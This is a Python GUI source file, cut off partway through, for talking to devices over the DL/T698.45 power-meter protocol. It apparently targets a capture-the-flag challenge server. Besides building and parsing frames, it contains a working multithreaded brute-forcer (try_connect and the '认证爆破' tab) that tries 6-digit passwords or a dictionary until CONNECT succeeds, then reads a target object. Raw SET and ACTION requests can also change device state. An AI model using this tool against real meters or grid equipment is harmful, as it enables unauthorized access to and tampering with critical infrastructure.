#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import struct
import threading
import queue
import sys
from datetime import datetime

try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox, filedialog
except ImportError:
    print("需要 tkinter, 请安装 python3-tk")
    sys.exit(1)


# ============================================================
#  协议常量
# ============================================================
START_BYTE = 0x68
END_BYTE = 0x16

# 控制域 C: 0x43 = 客户机发起(DIR=0,PRM=1) 用户数据(功能码3) 请求帧
CTRL_REQUEST = 0x43
# 0xC3 = 服务器响应(DIR=1,PRM=1) 用户数据
CTRL_RESPONSE = 0xC3

# APDU 服务命令字 (choice 标签, 客户机请求)
APDU_CONNECT_REQUEST = 0x02   # 建立应用连接
APDU_RELEASE_REQUEST = 0x01   # 断开应用连接
APDU_GET_REQUEST = 0x03       # 读取
APDU_SET_REQUEST = 0x04       # 设置
APDU_ACTION_REQUEST = 0x05    # 操作
APDU_PROXY_REQUEST = 0x07     # 代理

# APDU 服务命令字 (服务器响应)
APDU_CONNECT_RESPONSE = 0x82
APDU_RELEASE_RESPONSE = 0x81
APDU_GET_RESPONSE = 0x83
APDU_SET_RESPONSE = 0x84
APDU_ACTION_RESPONSE = 0x85
APDU_PROXY_RESPONSE = 0x87

APDU_CMD_NAME = {
    0x01: "RELEASE.Request", 0x81: "RELEASE.Response",
    0x02: "CONNECT.Request", 0x82: "CONNECT.Response",
    0x03: "GET.Request", 0x83: "GET.Response",
    0x04: "SET.Request", 0x84: "SET.Response",
    0x05: "ACTION.Request", 0x85: "ACTION.Response",
    0x07: "PROXY.Request", 0x87: "PROXY.Response",
}

# 认证类型 (CONNECT.Request 中)
AUTH_TYPE = {0: "匿名", 1: "普通密码", 2: "数据加密认证", 3: "数字签名认证"}


# ============================================================
#  CRC16 (DL/T698.45 FCS / HCS 校验, 多项式 0xA001)
# ============================================================
def crc16(data: bytes) -> bytes:
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA001
            else:
                crc >>= 1
    return struct.pack("<H", crc)


def crc16_int(data: bytes) -> int:
    return struct.unpack("<H", crc16(data))[0]


# ============================================================
#  压缩 BCD 编解码 (6 位数字 <-> 3 字节)
# ============================================================
def pwd_to_bcd(pwd):
    """6 位数字(字符串/int) -> 3 字节压缩 BCD"""
    s = f"{int(pwd):06d}"
    if len(s) != 6 or not s.isdigit():
        raise ValueError("密码必须为 6 位数字")
    return bytes([
        (int(s[0]) << 4) | int(s[1]),
        (int(s[2]) << 4) | int(s[3]),
        (int(s[4]) << 4) | int(s[5]),
    ])


def bcd_to_pwd(bcd: bytes) -> str:
    """3 字节压缩 BCD -> 6 位数字字符串"""
    out = []
    for b in bcd:
        out.append(str((b >> 4) & 0x0F))
        out.append(str(b & 0x0F))
    return "".join(out)


# ============================================================
#  工具函数
# ============================================================
def hex_str(b: bytes) -> str:
    return " ".join(f"{x:02X}" for x in b)


def parse_hex(s: str) -> bytes:
    s = s.strip()
    if s.lower().startswith("0x"):
        s = s[2:]
    s = s.replace(" ", "").replace("\t", "").replace("\n", "").replace(",", "")
    if len(s) % 2:
        raise ValueError("十六进制长度必须为偶数")
    return bytes.fromhex(s)


def bcd_pwd_valid(pwd) -> bool:
    try:
        pwd_to_bcd(pwd)
        return True
    except Exception:
        return False


# ============================================================
#  帧构造
# ============================================================
def build_frame(apdu: bytes, address: bytes = b"\x00" * 7, control: int = CTRL_REQUEST,
                compute_hcs: bool = True) -> bytes:
    """
    构造完整 DL/T698.45 帧:
      68 | L(2) | C | A(7) | HCS(2) | APDU | FCS(2) | 16
    FCS 覆盖 [0 : -3], HCS 覆盖 [1:11](长度+控制+地址)
    """
    if len(address) != 7:
        # 不足/超出 7 字节则补齐/截断 (题目服务端固定按 7 字节地址域处理)
        address = (address + b"\x00" * 7)[:7]

    # 先定长骨架 (不含 FCS 与结束符)
    body = bytearray()
    body.append(START_BYTE)
    # 长度占位 2 字节, 后填
    body.append(0)
    body.append(0)
    body.append(control)
    body += address
    # HCS 占位
    body.append(0)
    body.append(0)
    body += apdu
    # FCS 占位
    body.append(0)
    body.append(0)
    body.append(END_BYTE)

    total = len(body)
    # 长度域 = 整帧除起始字符和结束字符之外的长度 = total - 2
    length = total - 2
    body[1] = length & 0xFF
    body[2] = (length >> 8) & 0xFF

    # HCS: 覆盖 长度域 + 控制域 + 地址域 = body[1:11]
    if compute_hcs:
        hcs = crc16(bytes(body[1:11]))
        body[11] = hcs[0]
        body[12] = hcs[1]

    # FCS: 覆盖 整帧除结束字符和 FCS 本身 = body[0:-3]
    fcs = crc16(bytes(body[:-3]))
    body[-3] = fcs[0]
    body[-2] = fcs[1]
    return bytes(body)


def build_connect_apdu(password, auth_type: int = 1) -> bytes:
    apdu = bytearray(23)
    apdu[0] = APDU_CONNECT_REQUEST
    apdu[19] = auth_type & 0xFF
    apdu[20:23] = pwd_to_bcd(password)
    return bytes(apdu)


def build_get_apdu(oid: bytes, piid: int = 0) -> bytes:
    """
    GET.Request APDU
    apdu[0]=0x03, apdu[1]=PIID, apdu[2..5]=OID(4字节)
    """
    if len(oid) != 4:
        raise ValueError("OID 必须为 4 字节")
    apdu = bytearray(6)
    apdu[0] = APDU_GET_REQUEST
    apdu[1] = piid & 0xFF
    apdu[2:6] = oid
    return bytes(apdu)


def build_set_apdu(oid: bytes, data: bytes, piid: int = 0, attr_id: int = 0) -> bytes:
    """SET.Request APDU (通用): choice|PIID|OID(4)|attrID|data"""
    if len(oid) != 4:
        raise ValueError("OID 必须为 4 字节")
    apdu = bytearray()
    apdu.append(APDU_SET_REQUEST)
    apdu.append(piid & 0xFF)
    apdu += oid
    apdu.append(attr_id & 0xFF)
    apdu += data
    return bytes(apdu)


def build_action_apdu(oid: bytes, method_id: int = 0, data: bytes = b"", piid: int = 0) -> bytes:
    """ACTION.Request APDU (通用): choice|PIID|OID(4)|methodID|data"""
    if len(oid) != 4:
        raise ValueError("OID 必须为 4 字节")
    apdu = bytearray()
    apdu.append(APDU_ACTION_REQUEST)
    apdu.append(piid & 0xFF)
    apdu += oid
    apdu.append(method_id & 0xFF)
    apdu += data
    return bytes(apdu)


def build_release_apdu(piid: int = 0, reason: int = 0) -> bytes:
    """RELEASE.Request APDU: choice|PIID|reason"""
    return bytes([APDU_RELEASE_REQUEST, piid & 0xFF, reason & 0xFF])


# ============================================================
#  帧解析
# ============================================================
def parse_frame(frame: bytes) -> dict:
    """解析 DL/T698.45 帧, 返回字段字典 (宽松解析, 便于展示)"""
    info = {"raw": frame, "hex": hex_str(frame), "valid": False, "fields": [], "notes": []}
    if not frame:
        info["notes"].append("空响应")
        return info
    if frame[0] != START_BYTE:
        info["notes"].append(f"起始符异常: {frame[0]:02X} (期望 68H)")
    if frame[-1] != END_BYTE:
        info["notes"].append(f"结束符异常: {frame[-1]:02X} (期望 16H)")

    if len(frame) >= 3:
        length = frame[1] | (frame[2] << 8)
        info["fields"].append(("长度域 L", f"{length} (0x{length:04X})"))

    if len(frame) >= 4:
        c = frame[3]
        dir_bit = (c >> 7) & 1
        prm = (c >> 6) & 1
        frag = (c >> 5) & 1
        sc = (c >> 4) & 1
        func = c & 0x0F
        role = "客户机请求" if (dir_bit == 0 and prm == 1) else ("服务器响应" if dir_bit == 1 else "其他")
        info["fields"].append(("控制域 C",
            f"{c:02X}  DIR={dir_bit} PRM={prm} 分帧={frag} 扰码={sc} 功能码={func} ({role})"))

    if len(frame) >= 11:
        addr = frame[4:11]
        info["fields"].append(("地址域 A", hex_str(addr)))

    if len(frame) >= 13:
        hcs = frame[11:13]
        info["fields"].append(("帧头校验 HCS", hex_str(hcs)))

    # APDU 区 = frame[13 : -3]
    if len(frame) >= 16:
        apdu = frame[13:-3]
        info["apdu"] = apdu
        info["fields"].append(("APDU 长度", str(len(apdu))))
        if len(apdu) >= 1:
            cmd = apdu[0]
            name = APDU_CMD_NAME.get(cmd, f"未知(0x{cmd:02X})")
            info["fields"].append(("APDU 命令", f"0x{cmd:02X}  {name}"))
            info["cmd"] = cmd
            info["cmd_name"] = name

            # CONNECT.Response: apdu[2] = result (0=成功)
            if cmd == APDU_CONNECT_RESPONSE and len(apdu) >= 3:
                rc = apdu[2]
                info["fields"].append(("认证结果", f"{rc:02X} ({'成功' if rc == 0 else '失败'})"))
                info["auth_ok"] = (rc == 0)

            elif cmd == APDU_GET_RESPONSE and len(apdu) >= 8:
                piid = apdu[1]
                oid = apdu[2:6]
                attr = apdu[6]
                dlen = apdu[7]
                data = apdu[8:8 + dlen]
                info["fields"].append(("PIID", f"{piid:02X}"))
                info["fields"].append(("OID", hex_str(oid)))
                info["fields"].append(("属性ID", f"{attr:02X}"))
                info["fields"].append(("数据长度", str(dlen)))
                try:
                    text = data.decode("utf-8", errors="replace")
                except Exception:
                    text = ""
                info["fields"].append(("数据(hex)", hex_str(data)))
                info["fields"].append(("数据(text)", text))
                info["data"] = data
                info["data_text"] = text

            elif cmd == APDU_SET_RESPONSE and len(apdu) >= 3:
                info["fields"].append(("设置结果", f"{apdu[2]:02X}"))

            elif cmd == APDU_ACTION_RESPONSE and len(apdu) >= 3:
                info["fields"].append(("操作结果", f"{apdu[2]:02X}"))

            info["fields"].append(("APDU(hex)", hex_str(apdu)))

    if len(frame) >= 16:
        recv_fcs = frame[-3:-1]
        calc = crc16(frame[:-3])
        ok = recv_fcs == calc
        info["fields"].append(("帧校验 FCS", f"{hex_str(recv_fcs)}  {'✓校验通过' if ok else '✗校验失败 calc=' + hex_str(calc)}"))
        info["valid"] = ok
    return info


# ============================================================
#  网络收发
# ============================================================
def send_recv(sock: socket.socket, payload: bytes, timeout: float = 3.0,
              buf_size: int = 4096) -> bytes:
    """发送一帧并尝试读取响应 (按 698 帧结构尽量读取完整一帧)"""
    sock.sendall(payload)
    sock.settimeout(timeout)
    chunks = bytearray()
    try:
        while True:
            chunk = sock.recv(buf_size)
            if not chunk:
                break
            chunks += chunk
            # 尝试按长度域判断是否收完整
            if len(chunks) >= 3:
                length = chunks[1] | (chunks[2] << 8)
                # length = 整帧除起始/结束符之外的长度 -> 整帧长度 = length + 2
                expect = length + 2
                if len(chunks) >= expect:
                    break
            if len(chunks) > 65536:
                break
    except socket.timeout:
        pass
    return bytes(chunks)


def try_connect(host, port, password, oid,
                timeout=3.0, auth_type=1):
    """
    单次爆破: 建立连接 -> CONNECT(密码) -> 判定 -> 若成功则 GET(oid) 取数据
    返回 dict: {ok, password, resp, data, data_text, error}
    """
    result = {"ok": False, "password": password, "resp": b"", "data": b"", "data_text": "", "error": ""}
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            # CONNECT
            s.sendall(build_frame(build_connect_apdu(password, auth_type)))
            resp = b""
            try:
                resp = s.recv(4096)
            except socket.timeout:
                pass
            result["resp"] = resp
            if len(resp) >= 16 and resp[15] == 0x00:
                result["ok"] = True
                s.sendall(build_frame(build_get_apdu(oid)))
                try:
                    data = s.recv(4096)
                except socket.timeout:
                    data = b""
                result["data"] = data
                if len(data) > 24:
                    result["data_text"] = data[21:-3].decode("utf-8", errors="ignore")
                else:
                    p = parse_frame(data)
                    result["data_text"] = p.get("data_text", "")
    except Exception as e:
        result["error"] = str(e)
    return result


# ============================================================
#  GUI
# ============================================================
class Dlt698Tool(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("DL/T698.45 协议交互与认证爆破工具")
        self.geometry("1080x720")
        self.minsize(960, 640)

        # 运行状态
        self.host = tk.StringVar(value="127.0.0.1")
        self.port = tk.StringVar(value="6000")
        self.sock = None
        self.connected = False
        self.log_queue = queue.Queue()
        self.brute_stop = threading.Event()
        self.brute_running = False

        self._build_ui()
        self._poll_log()

    # ---------- UI 构建 ----------
    def _build_ui(self):
        # 顶部连接配置
        top = ttk.LabelFrame(self, text="目标连接")
        top.pack(fill="x", padx=8, pady=(8, 4))

        ttk.Label(top, text="目标 IP:").grid(row=0, column=0, padx=5, pady=6, sticky="e")
        ttk.Entry(top, textvariable=self.host, width=18).grid(row=0, column=1, padx=5)
        ttk.Label(top, text="端口:").grid(row=0, column=2, padx=5, sticky="e")
        ttk.Entry(top, textvariable=self.port, width=8).grid(row=0, column=3, padx=5)
        ttk.Button(top, text="建立 TCP 连接", command=self.connect_tcp).grid(row=0, column=4, padx=5)
        ttk.Button(top, text="断开", command=self.disconnect_tcp).grid(row=0, column=5, padx=5)
        self.conn_status = ttk.Label(top, text="● 未连接", foreground="gray")
        self.conn_status.grid(row=0, column=6, padx=10)

        # Notebook
        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=8, pady=4)
        self.tab_interact = ttk.Frame(nb)
        self.tab_brute = ttk.Frame(nb)
        self.tab_raw = ttk.Frame(nb)
        self.tab_log = ttk.Frame(nb)
        nb.add(self.tab_interact, text="协议交互")
        nb.add(self.tab_brute, text="认证爆破")
        nb.add(self.tab_raw, text="原始帧")
        nb.add(self.tab_log, text="流量日志")

        self._build_interact_tab()
        self._build_brute_tab()
        self._build_raw_tab()
        self._build_log_tab()

    # ---- 协议交互 Tab ----
    def _build_interact_tab(self):
        tab = self.tab_interact
        left = ttk.Frame(tab)
        left.pack(side="left", fill="both", expand=True, padx=(8, 4), pady=8)
        right = ttk.Frame(tab)
        right.pack(side="right", fill="both", expand=True, padx=(4, 8), pady=8)

        # ---- 左: 构造区 ----
        ttk.Label(left, text="协议功能选择", font=("", 11, "bold")).pack(anchor="w")

        self.func_var = tk.StringVar(value="CONNECT")
        funcs = [
            ("CONNECT 建立应用连接(认证)", "CONNECT"),
            ("GET 读取对象", "GET"),
            ("SET 设置对象", "SET"),
            ("ACTION 操作", "ACTION"),
            ("RELEASE 断开应用连接", "RELEASE"),
        ]
        for txt, val in funcs:
            ttk.Radiobutton(left, text=txt, variable=self.func_var, value=val,
                            command=self._on_func_change).pack(anchor="w", pady=1)

        sep = ttk.Separator(left, orient="horizontal")
        sep.pack(fill="x", pady=6)

        # 参数容器
        self.param_frame = ttk.Frame(left)
        self.param_frame.pack(fill="x")

        # 公共: 地址域
        ttk.Label(self.param_frame, text="地址域 A (hex, 7字节):").grid(row=0, column=0, sticky="e", padx=4, pady=3)
        self.addr_var = tk.StringVar(value="")
        ttk.Entry(self.param_frame, textvariable=self.addr_var, width=26).grid(row=0, column=1, padx=4)

        # CONNECT 参数
        self.connect_row = self._make_rows(self.param_frame, start=1, rows=[
            ("认证类型:", [("匿名(0)", 0), ("普通密码(1)", 1), ("数据加密(2)", 2), ("数字签名(3)", 3)], "auth_type", ""),
            ("密码 (6位数字):", None, "password", ""),
        ])

        # GET 参数
        self.get_row = self._make_rows(self.param_frame, start=3, rows=[
            ("OID (hex, 4字节):", None, "oid", ""),
            ("PIID:", None, "piid_get", ""),
        ])

        # SET 参数
        self.set_row = self._make_rows(self.param_frame, start=5, rows=[
            ("OID (hex, 4字节):", None, "oid_set", ""),
            ("属性ID:", None, "attr_id", ""),
            ("数据 (hex):", None, "set_data", ""),
        ])

        # ACTION 参数
        self.action_row = self._make_rows(self.param_frame, start=8, rows=[
            ("OID (hex, 4字节):", None, "oid_act", ""),
            ("方法ID:", None, "method_id", ""),
            ("参数 (hex):", None, "act_data", ""),
        ])

        # RELEASE 参数 (无额外参数)

        self.vars = {
            "auth_type": getattr(self, "var_auth_type", None),
        }
        self._on_func_change()

        btn_frame = ttk.Frame(left)
        btn_frame.pack(fill="x", pady=8)
        ttk.Button(btn_frame, text="构造并发送", command=self.send_interactive).pack(side="left", padx=4)
        ttk.Button(btn_frame, text="仅构造(预览帧)", command=self.preview_interactive).pack(side="left", padx=4)
        ttk.Button(btn_frame, text="清空响应", command=self.clear_response).pack(side="left", padx=4)

        # ---- 右: 响应/解析区 ----
        ttk.Label(right, text="发送帧 (hex)", font=("", 10, "bold")).pack(anchor="w")
        self.send_text = scrolledtext.ScrolledText(right, height=6, font=("Consolas", 10), wrap="none")
        self.send_text.pack(fill="x", pady=(0, 6))

        ttk.Label(right, text="接收响应 (hex)", font=("", 10, "bold")).pack(anchor="w")
        self.recv_text = scrolledtext.ScrolledText(right, height=6, font=("Consolas", 10), wrap="none")
        self.recv_text.pack(fill="x", pady=(0, 6))

        ttk.Label(right, text="字段解析", font=("", 10, "bold")).pack(anchor="w")
        self.parse_tree = ttk.Treeview(right, columns=("field", "value"), show="headings", height=14)
        self.parse_tree.heading("field", text="字段")
        self.parse_tree.heading("value", text="值")
        self.parse_tree.column("field", width=140)
        self.parse_tree.column("value", width=360)
        self.parse_tree.pack(fill="both", expand=True)

    def _make_rows(self, parent, start, rows):
        """动态创建参数行. rows: list of (label, options_or_None, varname, default)
           options_or_None: None -> 文本输入; list of (text,value) -> 下拉"""
        r = start
        for label, options, varname, default in rows:
            ttk.Label(parent, text=label).grid(row=r, column=0, sticky="e", padx=4, pady=3)
            if options is None:
                var = tk.StringVar(value=str(default))
                setattr(self, "var_" + varname, var)
                ttk.Entry(parent, textvariable=var, width=26).grid(row=r, column=1, padx=4)
            else:
                var = tk.StringVar(value=str(default))
                setattr(self, "var_" + varname, var)
                ttk.Combobox(parent, textvariable=var, values=[v for _, v in options],
                             state="readonly", width=22).grid(row=r, column=1, padx=4)
                # 显示映射用
                setattr(self, "opts_" + varname, options)
            r += 1
        return r

    def _on_func_change(self):
        # 根据 radio 选择, 显示/隐藏对应参数行 (简单起见全显示, 但提示)
        pass

    def clear_response(self):
        self.recv_text.delete("1.0", "end")
        self.parse_tree.delete(*self.parse_tree.get_children())

    # ---- 认证爆破 Tab ----
    def _build_brute_tab(self):
        tab = self.tab_brute
        cfg = ttk.LabelFrame(tab, text="爆破配置")
        cfg.pack(fill="x", padx=8, pady=8)

        ttk.Label(cfg, text="密码起点 (6位):").grid(row=0, column=0, sticky="e", padx=4, pady=4)
        self.brute_start = tk.StringVar(value="")
        ttk.Entry(cfg, textvariable=self.brute_start, width=10).grid(row=0, column=1, padx=4)
        ttk.Label(cfg, text="终点 (含):").grid(row=0, column=2, sticky="e", padx=4)
        self.brute_end = tk.StringVar(value="")
        ttk.Entry(cfg, textvariable=self.brute_end, width=10).grid(row=0, column=3, padx=4)

        ttk.Label(cfg, text="字典文件(可选):").grid(row=1, column=0, sticky="e", padx=4, pady=4)
        self.dict_file = tk.StringVar(value="")
        ttk.Entry(cfg, textvariable=self.dict_file, width=24).grid(row=1, column=1, padx=4)
        ttk.Button(cfg, text="选择...", command=self._choose_dict).grid(row=1, column=2, padx=4)

        ttk.Label(cfg, text="线程数:").grid(row=1, column=3, sticky="e", padx=4)
        self.brute_threads = tk.StringVar(value="")
        ttk.Entry(cfg, textvariable=self.brute_threads, width=8).grid(row=1, column=4, padx=4)

        ttk.Label(cfg, text="目标 OID (hex 4字节):").grid(row=2, column=0, sticky="e", padx=4, pady=4)
        self.brute_oid = tk.StringVar(value="")
        ttk.Entry(cfg, textvariable=self.brute_oid, width=18).grid(row=2, column=1, padx=4)
        ttk.Label(cfg, text="超时(秒):").grid(row=2, column=2, sticky="e", padx=4)
        self.brute_timeout = tk.StringVar(value="")
        ttk.Entry(cfg, textvariable=self.brute_timeout, width=8).grid(row=2, column=3, padx=4)

        # 按钮
        bfrm = ttk.Frame(tab)
        bfrm.pack(fill="x", padx=8)
        ttk.Button(bfrm, text="▶ 开始爆破", command=self.start_brute).pack(side="left", padx=4)
        ttk.Button(bfrm, text="■ 停止", command=self.stop_brute).pack(side="left", padx=4)

        # 进度
        pfrm = ttk.Frame(tab)
        pfrm.pack(fill="x", padx=8, pady=6)
        self.brute_progress = ttk.Progressbar(pfrm, mode="determinate")
        self.brute_progress.pack(side="left", fill="x", expand=True, padx=(0, 8))
        self.brute_pct = ttk.Label(pfrm, text="0%")
        self.brute_pct.pack(side="left")

        # 结果
        rfrm = ttk.LabelFrame(tab, text="结果")
        rfrm.pack(fill="both", expand=True, padx=8, pady=4)
        self.brute_result = scrolledtext.ScrolledText(rfrm, font=("Consolas", 10), height=14)
        self.brute_result.pack(fill="both", expand=True, padx=4, pady=4)

    def _choose_dict(self):
        p = filedialog.askopenfilename(filetypes=[("文本", "*.txt"), ("所有", "*.*")])
        if p:
            self.dict_file.set(p)

    # ---- 原始帧 Tab ----
    def _build_raw_tab(self):
        tab = self.tab_raw
        ttk.Label(tab, text="手动输入十六进制帧 (空格分隔, 自动加不加都行; 校验位可不填由下面选项控制)").pack(anchor="w", padx=8, pady=(8, 4))
        self.raw_text = scrolledtext.ScrolledText(tab, font=("Consolas", 10), height=10, wrap="none")
        self.raw_text.pack(fill="x", padx=8)

        rf = ttk.Frame(tab)
        rf.pack(fill="x", padx=8, pady=6)
        self.recalc_fcs = tk.BooleanVar(value=True)
        ttk.Checkbutton(rf, text="发送前自动重算 FCS/HCS (以数据内容为准)", variable=self.recalc_fcs).pack(side="left")
        ttk.Button(rf, text="发送", command=self.send_raw).pack(side="left", padx=8)
        ttk.Button(rf, text="格式化显示", command=self.fmt_raw).pack(side="left")

        ttk.Label(tab, text="响应:").pack(anchor="w", padx=8)
        self.raw_resp = scrolledtext.ScrolledText(tab, font=("Consolas", 10), height=10, wrap="none")
        self.raw_resp.pack(fill="both", expand=True, padx=8, pady=(0, 8))

    def fmt_raw(self):
        try:
            data = parse_hex(self.raw_text.get("1.0", "end"))
        except Exception as e:
            self.log(f"格式化失败: {e}")
            return
        self.raw_text.delete("1.0", "end")
        self.raw_text.insert("1.0", hex_str(data))

    # ---- 日志 Tab ----
    def _build_log_tab(self):
        tab = self.tab_log
        self.log_text = scrolledtext.ScrolledText(tab, font=("Consolas", 10), wrap="none")
        self.log_text.pack(fill="both", expand=True, padx=8, pady=8)
        bf = ttk.Frame(tab)
        bf.pack(fill="x", padx=8, pady=(0, 8))
        ttk.Button(bf, text="清空日志", command=lambda: self.log_text.delete("1.0", "end")).pack(side="left")
        self.autoscroll = tk.BooleanVar(value=True)
        ttk.Checkbutton(bf, text="自动滚动", variable=self.autoscroll).pack(side="left", padx=10)

    # ============================================================
    #  日志
    # ============================================================
    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_queue.put(f"[{ts}] {msg}")

    def _poll_log(self):
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self.log_text.insert("end", msg + "\n")
                if self.autoscroll.get():
                    self.log_text.see("end")
        except queue.Empty:
            pass
        self.after(120, self._poll_log)

    # ============================================================
    #  TCP 连接管理 (交互用长连接)
    # ============================================================
    def get_host_port(self):
        host = self.host.get().strip()
        try:
            port = int(self.port.get().strip())
        except ValueError:
            port = 6000
        return host, port

    def connect_tcp(self):
        if self.connected:
            self.log("已连接, 先断开再重连")
            return
        host, port = self.get_host_port()
        try:
            self.sock = socket.create_connection((host, port), timeout=5)
            self.sock.settimeout(3)
            self.connected = True
            self.conn_status.config(text="● 已连接", foreground="green")
            self.log(f"TCP 已连接 {host}:{port}")
        except Exception as e:
            self.log(f"连接失败: {e}")
            self.connected = False

    def disconnect_tcp(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        self.sock = None
        self.connected = False
        self.conn_status.config(text="● 未连接", foreground="gray")
        self.log("TCP 已断开")

    def _ensure_sock(self):
        """未连接则自动建立一次性连接 (发送后保持)"""
        if not self.connected or self.sock is None:
            self.connect_tcp()
        return self.connected and self.sock is not None

    # ============================================================
    #  协议交互
    # ============================================================
    def _build_apdu_for_func(self):
        """构造当前功能对应的 APDU; 必填项为空时抛 ValueError 提示"""
        func = self.func_var.get()
        missing = []

        addr_s = self.addr_var.get().strip()
        if not addr_s:
            missing.append("地址域")
        else:
            try:
                addr = parse_hex(addr_s)
            except Exception:
                missing.append("地址域(格式)")
        if not addr_s:
            addr = b""

        apdu = b""
        if func == "CONNECT":
            if not self.var_auth_type.get().strip():
                missing.append("认证类型")
            if not self.var_password.get().strip():
                missing.append("密码")
            if not missing:
                apdu = build_connect_apdu(self.var_password.get().strip(),
                                          int(self.var_auth_type.get()))
        elif func == "GET":
            if not self.var_oid.get().strip(): missing.append("OID")
            if not self.var_piid_get.get().strip(): missing.append("PIID")
            if not missing:
                apdu = build_get_apdu(parse_hex(self.var_oid.get()),
                                      int(self.var_piid_get.get()))
        elif func == "SET":
            if not self.var_oid_set.get().strip(): missing.append("OID")
            if not self.var_attr_id.get().strip(): missing.append("属性ID")
            if not self.var_set_data.get().strip(): missing.append("数据")
            if not missing:
                apdu = build_set_apdu(parse_hex(self.var_oid_set.get()),
                                      parse_hex(self.var_set_data.get()),
                                      0, int(self.var_attr_id.get()))
        elif func == "ACTION":
            if not self.var_oid_act.get().strip(): missing.append("OID")
            if not self.var_method_id.get().strip(): missing.append("方法ID")
            if not self.var_act_data.get().strip(): missing.append("参数")
            if not missing:
                apdu = build_action_apdu(parse_hex(self.var_oid_act.get()),
                                         int(self.var_method_id.get()),
                                         parse_hex(self.var_act_data.get()), 0)
        elif func == "RELEASE":
            apdu = build_release_apdu()

        if missing:
            raise ValueError("请填写必要内容: " + "、".join(missing))
        return func, addr, apdu

    def preview_interactive(self):
        try:
            func, addr, apdu = self._build_apdu_for_func()
            frame = build_frame(apdu, addr)
        except ValueError as e:
            messagebox.showwarning("未填写必要内容", str(e))
            self.log(str(e))
            return
        except Exception as e:
            self.log(f"构造失败: {e}")
            messagebox.showerror("构造失败", str(e))
            return
        self.send_text.delete("1.0", "end")
        self.send_text.insert("1.0", hex_str(frame))
        self.log(f"预览 {func} 帧 ({len(frame)} 字节)")

    def send_interactive(self):
        try:
            func, addr, apdu = self._build_apdu_for_func()
            frame = build_frame(apdu, addr)
        except ValueError as e:
            messagebox.showwarning("未填写必要内容", str(e))
            self.log(str(e))
            return
        except Exception as e:
            self.log(f"构造失败: {e}")
            messagebox.showerror("构造失败", str(e))
            return
        self.send_text.delete("1.0", "end")
        self.send_text.insert("1.0", hex_str(frame))

        host, port = self.get_host_port()
        # 在后台线程发送, 避免 UI 卡顿
        threading.Thread(target=self._send_worker, args=(host, port, frame, func), daemon=True).start()

    def _send_worker(self, host, port, frame, func):
        # 优先复用已连接的 socket
        sock = None
        own = False
        if self.connected and self.sock is not None:
            sock = self.sock
        else:
            try:
                sock = socket.create_connection((host, port), timeout=5)
                own = True
            except Exception as e:
                self.log(f"连接失败: {e}")
                return
        try:
            resp = send_recv(sock, frame, timeout=3.0)
        except Exception as e:
            self.log(f"发送/接收错误: {e}")
            if own:
                try: sock.close()
                except Exception: pass
            return
        finally:
            if own:
                try: sock.close()
                except Exception: pass

        # 回到主线程更新 UI
        self.after(0, lambda: self._show_response(resp, func))

    def _show_response(self, resp, func):
        self.recv_text.delete("1.0", "end")
        self.recv_text.insert("1.0", hex_str(resp) if resp else "(无响应)")
        self.parse_tree.delete(*self.parse_tree.get_children())
        info = parse_frame(resp)
        for k, v in info["fields"]:
            self.parse_tree.insert("", "end", values=(k, v))
        for note in info.get("notes", []):
            self.parse_tree.insert("", "end", values=("提示", note))
        # 特殊提示
        if func == "CONNECT" and "auth_ok" in info:
            if info["auth_ok"]:
                self.log("✓ CONNECT 认证成功")
            else:
                self.log("✗ CONNECT 认证失败")
        if func == "GET" and "data_text" in info and info["data_text"]:
            self.log(f"GET 数据: {info['data_text']}")

    # ============================================================
    #  原始帧发送
    # ============================================================
    def send_raw(self):
        try:
            data = parse_hex(self.raw_text.get("1.0", "end"))
        except Exception as e:
            self.log(f"原始帧解析失败: {e}")
            messagebox.showerror("解析失败", str(e))
            return
        if not data:
            return
        if self.recalc_fcs.get():
            # 如果像完整帧 (68..16) 则重算 HCS/FCS; 否则当作 APDU 包一层
            if len(data) >= 2 and data[0] == START_BYTE and data[-1] == END_BYTE:
                apdu = data[13:-3] if len(data) >= 16 else data
                addr = data[4:11] if len(data) >= 11 else b"\x00" * 7
                ctrl = data[3] if len(data) >= 4 else CTRL_REQUEST
                data = build_frame(apdu, addr, ctrl)
            else:
                data = build_frame(data)
        host, port = self.get_host_port()
        threading.Thread(target=self._raw_worker, args=(host, port, data), daemon=True).start()

    def _raw_worker(self, host, port, data):
        self.log(f"发送原始帧: {hex_str(data)}")
        try:
            with socket.create_connection((host, port), timeout=5) as s:
                resp = send_recv(s, data, timeout=3.0)
        except Exception as e:
            self.log(f"原始帧发送错误: {e}")
            return
        self.after(0, lambda: self.raw_resp.delete("1.0", "end"))
        self.after(0, lambda: self.raw_resp.insert("1.0", hex_str(resp) if resp else "(无响应)"))
        self.log(f"响应: {hex_str(resp) if resp else '(无)'}")

    # ============================================================
    #  认证爆破
    # ============================================================
    def start_brute(self):
        if self.brute_running:
            self.log("爆破正在进行中")
            return
        host, port = self.get_host_port()

        # 必填项校验
        missing = []
        if not self.brute_oid.get().strip(): missing.append("目标 OID")
        if not self.brute_threads.get().strip(): missing.append("线程数")
        if not self.brute_timeout.get().strip(): missing.append("超时")
        dict_path = self.dict_file.get().strip()
        if not dict_path:
            if not self.brute_start.get().strip(): missing.append("密码起点")
            if not self.brute_end.get().strip(): missing.append("终点")
        if missing:
            msg = "请填写必要内容: " + "、".join(missing)
            messagebox.showwarning("未填写必要内容", msg)
            self.log(msg)
            return

        # OID
        try:
            oid = parse_hex(self.brute_oid.get())
            if len(oid) != 4:
                raise ValueError("OID 必须 4 字节")
        except ValueError as e:
            messagebox.showerror("OID 错误", str(e))
            return
        # 线程数 / 超时
        try:
            timeout = float(self.brute_timeout.get())
            threads = max(1, int(self.brute_threads.get()))
        except ValueError:
            messagebox.showerror("参数错误", "线程数 / 超时必须为数字")
            return

        if dict_path:
            try:
                with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
                    passwords = [l.strip() for l in f if l.strip()]
            except Exception as e:
                messagebox.showerror("字典读取失败", str(e))
                return
        else:
            try:
                start = int(self.brute_start.get())
                end = int(self.brute_end.get())
            except ValueError:
